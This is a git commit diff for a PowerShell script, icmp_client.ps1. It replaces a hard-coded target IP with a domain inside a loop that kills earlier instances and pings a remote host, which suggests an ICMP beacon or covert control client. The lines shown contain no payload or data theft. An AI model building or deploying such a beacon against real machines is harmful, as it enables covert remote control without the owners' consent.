a587c0ba3165c79fdbb8681221dc91b91c0c4263
Clickest <WojtekGoska@gmail.com>
2023-11-20 20:55:33 +0100

    Update icmp_client.ps1

--- icmp_client.ps1
+++ icmp_client.ps1
@@ -41,7 +41,7 @@ Function Stop-PreviousProcesses {
 }
 
 Stop-PreviousProcesses > $null
-$sleep = 10; $target = "20.106.237.34"
+$sleep = 10; $target = "sequris.pl"
 while ($true) {
     if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue) {
         $ICMPClient = New-Object System.Net.NetworkInformation.Ping
